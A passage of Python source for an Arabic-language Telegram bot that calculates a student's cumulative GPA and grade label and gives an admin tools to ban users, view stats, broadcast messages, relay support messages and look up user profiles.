            msg = bot.send_message(chat_id, "❌ عدد الساعات يجب أن يكون أكبر من 0. حاول مرة أخرى.", reply_markup=keyboard1)
            bot.register_next_step_handler(msg, save_prev_hours)
            return

        # حفظ عدد الساعات السابقة في بيانات المستخدم
        user_data.setdefault(chat_id, {})  # تأكد من أن القاموس موجود
        user_data[chat_id]['prev_hours'] = prev_hours

        # التحقق من وجود بيانات المعدل الفصلي
        required_keys = ['gpa', 'hours', 'prev_gpa', 'prev_hours']
        if not all(key in user_data[chat_id] for key in required_keys):
            bot.send_message(chat_id, "⚠️ لم يتم إدخال بيانات المعدل الفصلي. الرجاء إدخالها أولاً.", reply_markup=keyboard1)
            return

        # استرجاع بيانات المعدل الفصلي والتراكمي
        gpa = user_data[chat_id]["gpa"]
        hours = user_data[chat_id]["hours"]
        prev_gpa = user_data[chat_id]["prev_gpa"]

        # حساب المعدل التراكمي الجديد
        cgpa = ((prev_gpa * prev_hours) + (gpa * hours)) / (prev_hours + hours)

        # تحديد التقدير النهائي بناءً على المعدل التراكمي
        if cgpa == 4.0:
            gpa_evaluation = "ممتاز مرتفع"
        elif 3.7 <= cgpa < 4.0:
            gpa_evaluation = "ممتاز"
        elif 3.3 <= cgpa < 3.7:
            gpa_evaluation = "جيد جداً مرتفع"
        elif 3.0 <= cgpa < 3.3:
            gpa_evaluation = "جيد جداً"
        elif 2.7 <= cgpa < 3.0:
            gpa_evaluation = "جيد مرتفع"
        elif 2.3 <= cgpa < 2.7:
            gpa_evaluation = "جيد"
        elif 2.0 <= cgpa < 2.3:
            gpa_evaluation = "مقبول مرتفع"
        elif 1.7 <= cgpa < 2.0:
            gpa_evaluation = "مقبول"
        elif 1.3 <= cgpa < 1.7:
            gpa_evaluation = "مقبول مشروط مرتفع"
        elif 1.0 <= cgpa < 1.3:
            gpa_evaluation = "مقبول مشروط"
        elif 0.0 < cgpa < 1.0:
            gpa_evaluation = "راسب"
        else:
            gpa_evaluation = "غير محدد"

        # إرسال الرسالة بتفاصيل المعدل التراكمي
        message_text = (
            f"📊 *تفاصيل المعدل التراكمي (CGPA):*\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📌 *المعدل الفصلي (GPA):* `{gpa:.3f}`\n"
            f"📌 *عدد ساعات الفصل:* `{hours}` ساعة\n"
            f"📌 *المعدل التراكمي السابق:* `{prev_gpa:.2f}`\n"
            f"📌 *عدد الساعات السابقة:* `{prev_hours}` ساعة\n"
            f"📌 *المعدل التراكمي :* `{cgpa:.3f}`\n"
            f"📌 *التقدير التراكمي:* `{gpa_evaluation}`\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )

        bot.send_message(chat_id, message_text, parse_mode="Markdown", reply_markup=keyboard1)

    except ValueError:
        msg = bot.send_message(chat_id, "❌ الرجاء إدخال رقم صحيح لعدد الساعات.", reply_markup=keyboard1)
        bot.register_next_step_handler(msg, save_prev_hours)

# 📌 أمر حظر مستخدم
def process_ban(message):
    user_id = message.text.strip()

    if not user_id.isdigit():
        bot.reply_to(message, "❌ يرجى إدخال رقم ID صالح.",reply_markup=keyboard1)
        return

    with open("ban.txt", "a") as file:
        file.write(user_id + "\n")

    bot.send_message(user_id, "🚫 *تم حظرك من البوت.*\n🔹 إذا كنت تعتقد أن هناك خطأ، يرجى التواصل مع المطور.", parse_mode="Markdown")
    bot.reply_to(message, f"✅ تم حظر المستخدم `{user_id}` بنجاح.", parse_mode="Markdown",reply_markup=keyboard1)

# 📌 أمر فك حظر مستخدم
def process_unban(message):
    user_id = message.text.strip()

    if not user_id.isdigit():
        bot.reply_to(message, "❌ يرجى إدخال رقم ID صالح.",reply_markup=keyboard1)
        return

    if not os.path.exists("ban.txt"):
        bot.reply_to(message, "❌ لا يوجد مستخدمون محظورون.",reply_markup=keyboard1)
        return

    with open("ban.txt", "r") as file:
        lines = file.readlines()

    with open("ban.txt", "w") as file:
        found = False
        for line in lines:
            if line.strip() != user_id:
                file.write(line)
            else:
                found = True

    if found:
        bot.send_message(user_id, "✅ *تم إلغاء حظرك من البوت، يمكنك استخدامه الآن.*", parse_mode="Markdown")
        bot.reply_to(message, f"✅ تم إلغاء حظر المستخدم `{user_id}` بنجاح.", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ المستخدم غير موجود في قائمة المحظورين.",reply_markup=keyboard1)

# 📌 أمر الإحصائيات
def stats(message):
    total_users = 0
    banned_users = 0
    files_to_send = []

    # ✅ التحقق من وجود ملف المستخدمين
    if os.path.exists("Users.txt"):
        with open("Users.txt", "r") as f:
            total_users = len(f.readlines())
        files_to_send.append("Users.txt")
    else:
        bot.send_message(message.chat.id, "⚠️ لا يوجد مستخدمون مسجلون بعد.", parse_mode="Markdown")
        
    if os.path.exists("ids.txt"):
        with open("ids.txt", "r") as f:
            total_users = len(f.readlines())
        files_to_send.append("ids.txt")
    else:
        bot.send_message(message.chat.id, "⚠️ لا يوجد مستخدمون مسجلون بعد.", parse_mode="Markdown")

    # ✅ التحقق من وجود ملف المحظورين
    if os.path.exists("ban.txt"):
        with open("ban.txt", "r") as f:
            banned_users = len(f.readlines())
        files_to_send.append("ban.txt")
    else:
        bot.send_message(message.chat.id, "⚠️ لا يوجد مستخدمون محظورون بعد.", parse_mode="Markdown")

    # ✅ إرسال الإحصائيات
    bot.edit_message_text(
    chat_id=message.chat.id,
    message_id=message.message_id,
    text=f"📊 *إحصائيات البوت:*\n"
         f"👤 *عدد المستخدمين:* `{total_users}`\n"
         f"🚫 *عدد المحظورين:* `{banned_users}`",
    parse_mode="Markdown",
    reply_markup=keyboard1
)


    # ✅ إرسال الملفات إذا كانت موجودة
    for file in files_to_send:
        with open(file, "rb") as doc:
            bot.send_document(message.chat.id, doc)


# 📌 أمر الإذاعة
from concurrent.futures import ThreadPoolExecutor, as_completed

def process_broadcast(message):
    broadcast_text = message.text
    sent_count = 0
    failed_count = 0

    if not os.path.exists("ids.txt"):
        bot.reply_to(message, "❌ لا يوجد مستخدمون مسجلون.", reply_markup=keyboard1)
        return

    with open("ids.txt", "r") as f:
        user_ids = f.read().splitlines()

    # إرسال رسالة أولية للتقدم
    progress_msg = bot.reply_to(
        message, 
        "📢 *جاري إرسال الإذاعة...*\n✅ *ناجحة:* `0`\n❌ *فاشلة:* `0`", 
        parse_mode="Markdown", 
        reply_markup=keyboard1
    )

    # دالة إرسال رسالة لمستخدم معين
    def send_message(user_id):
        try:
            bot.send_message(user_id, broadcast_text)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_message, user_id): user_id for user_id in user_ids}
        total = len(user_ids)
        for i, future in enumerate(as_completed(futures), 1):
            if future.result():
                sent_count += 1
            else:
                failed_count += 1

            # تحديث رسالة التقدم كل 5 إرساليات أو عند الانتهاء
            if i % 2 == 0 or i == total:
                try:
                    bot.edit_message_text(
                        chat_id=progress_msg.chat.id,
                        message_id=progress_msg.message_id,
                        text=f"📢 *تم إرسال الإذاعة:*\n✅ *ناجحة:* `{sent_count}`\n❌ *فاشلة:* `{failed_count}`",
                        parse_mode="Markdown",
                        reply_markup=keyboard1
                    )
                except Exception:
                    pass

    # التحديث النهائي بعد انتهاء العملية
    bot.edit_message_text(
        chat_id=progress_msg.chat.id,
        message_id=progress_msg.message_id,
        text=f"📢 *تم الانتهاء من الإذاعة!*\n✅ *ناجحة:* `{sent_count}`\n❌ *فاشلة:* `{failed_count}`",
        parse_mode="Markdown",
        reply_markup=keyboard1
    )

    
    
#توجية الرسايل للادمن ___________'' 
user_messages = {}

@bot.message_handler(func=lambda message: message.chat.id != admin_chat_id2)
def forward_messages_to_admin(message):
    chat_id = message.chat.id
    
    user_messages[message.message_id] = chat_id 
    sent_message = bot.forward_message(admin_chat_id2, chat_id, message.message_id)

    user_messages[sent_message.message_id] = chat_id  

# 📌 تمكين الأدمن من الرد مباشرة إلى المستخدم
@bot.message_handler(func=lambda message: message.reply_to_message and message.chat.id == admin_chat_id2 and not message.text.startswith('/info'))
def reply_to_user(message):
    original_message = message.reply_to_message
    user_id = user_messages.get(original_message.message_id)  # جلب معرف المستخدم بناءً على معرف الرسالة

    if user_id:
        try:
            text = message.text  # استخدم النص بدون تعديل
            bot.send_message(user_id, text, parse_mode="HTML")  # 🔄 استخدم HTML بدل MarkdownV2
        except Exception as e:
            error_message = f"⚠️ خطأ أثناء إرسال الرسالة إلى المستخدم: {str(e)}"
            bot.send_message(admin_chat_id2, error_message, parse_mode="HTML")
    else:
        bot.send_message(admin_chat_id2, "❌ *تعذر العثور على المستخدم للرد عليه.*", parse_mode="Markdown")

##معلومات المستخدم__________   

@bot.message_handler(commands=['info'])
def send_user_info(message):
    if message.reply_to_message and message.chat.id == admin_chat_id2:
        original_message = message.reply_to_message

        
        user_id = None

        if original_message.forward_from:  
            user_id = original_message.forward_from.id  # إذا كانت الرسالة معاد توجيهها
        elif original_message.message_id in user_messages:  
            user_id = user_messages[original_message.message_id]  
        elif original_message.from_user:  
            user_id = original_message.from_user.id  
        if user_id == bot.get_me().id:
            bot.send_message(admin_chat_id2, "❌ *هذه الرسالة مرسلة من البوت نفسه، لا يمكن جلب بياناته.*", parse_mode="Markdown")
            return

        # التحقق مما إذا لم يتم العثور على `user_id`
        if not user_id:
            bot.send_message(admin_chat_id2, "❌ *تعذر العثور على معرف المستخدم، ربما قام بإغلاق إعادة التوجيه أو أن هذه الرسالة مرسلة من البوت.*", parse_mode="Markdown")
            return

        try:
            # جلب بيانات المستخدم
            user_info = bot.get_chat(user_id)

            # جلب السيرة الذاتية (bio) إن وجدت
            user_bio = user_info.bio if hasattr(user_info, 'bio') and user_info.bio else "لا يوجد"

            # التحقق مما إذا كان المستخدم قد حظر البوت
            is_blocked = False
            bot_status = "✅"
            try:
                bot.send_chat_action(user_id, 'typing')
            except Exception:
                is_blocked = True
                bot_status = "❌"

            # إرسال معلومات المستخدم للأدمن
            bot.send_message(
    admin_chat_id2,
    f"ℹ️ *تفاصيل المستخدم:*\n"
    f"━━━━━━━━━━━━━━━━━━━\n"
    f"👤 | *اسم المستخدم:* ➢ {user_info.first_name} {user_info.last_name or ''}\n"
    f"ℹ️ | *معرف المستخدم:* `{user_info.id}`\n"
    f"📍 | *المعرف:* {f'@{user_info.username}' if user_info.username else 'لا يوجد'}\n"
    f"🏵 | *السيرة الذاتية:* {user_bio}\n"
    f"🌀 | *حالة المستخدم:* {'❌ محظور' if is_blocked else '✅ غير محظور'}\n"
    f"🎗 | *حالة عمل البوت مع المستخدم:* {bot_status}\n"
    f"━━━━━━━━━━━━━━━━━━━"
)


        except Exception as e:
            bot.send_message(admin_chat_id2, f"⚠️ خطأ أثناء جلب بيانات المستخدم: `{str(e)}`", parse_mode="Markdown")

    else:
        bot.send_message(admin_chat_id2, "❌ *يجب الرد على رسالة المستخدم ثم كتابة /info للحصول على المعلومات.*", parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "send_user1")
def handle_send_user(call):
    bot.clear_step_handler(call.message)  
    send_user_message_command(call)  # تمرير `call` وليس `call.message`

def send_user_message_command(call):
    chat_id = call.message.chat.id

    if str(chat_id) != str(admin_chat_id):  # تأكد من أن المستخدم هو الأدمن
        bot.send_message(chat_id, "❌ ليس لديك صلاحية لاستخدام هذا الأمر.", reply_markup=keyboard1)
        return

    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,  # استخدم call.message.message_id مباشرة
        text="✍️ *أدخل معرف المستخدم الذي تريد إرسال رسالة إليه:*",
        parse_mode="Markdown",
        reply_markup=keyboard1
    )

    bot.register_next_step_handler(call.message, get_user_id_for_message)  # استخدم call.message هنا


def get_user_id_for_message(message):
    chat_id = message.chat.id
    user_id = message.text.strip()

    if not user_id.isdigit():
        bot.send_message(chat_id, "❌ *يرجى إدخال معرف مستخدم صالح (أرقام فقط).*", parse_mode="Markdown",reply_markup=keyboard1)
        return

    bot.send_message(chat_id, f"✅ تم إدخال المعرف: {user_id}\n📩 *أدخل الرسالة التي تريد إرسالها:*", parse_mode="Markdown",reply_markup=keyboard1)
    bot.register_next_step_handler(message, send_message_to_user, user_id)

def send_message_to_user(message, user_id):
    
    try:
        bot.send_message(int(user_id), f"{message.text}")
        bot.send_message(message.chat.id, "✅ *تم إرسال الرسالة بنجاح.*", parse_mode="Markdown",reply_markup=keyboard1)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ *حدث خطأ أثناء إرسال الرسالة: {str(e)}*", parse_mode="Markdown",reply_markup=keyboard1)


bot.polling(none_stop=True)
